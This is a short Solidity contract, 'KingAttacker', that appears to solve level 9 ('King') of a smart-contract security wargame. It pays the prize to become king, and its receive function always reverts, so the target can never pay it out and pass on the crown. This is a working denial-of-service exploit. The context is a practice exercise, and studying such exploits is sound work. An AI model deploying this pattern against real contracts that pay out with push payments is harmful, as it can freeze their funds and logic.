// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/9-King.sol";

contract KingAttacker {
    King public king;

    constructor(address payable _king) {
        king = King(_king);
    }

    function becomeKing() external payable returns (bool success) {
        require(msg.value >= king.prize(), "Not enough ETH");
        (success,) = address(king).call{value: msg.value}("");
    }

    receive() external payable {
        revert();
    }
}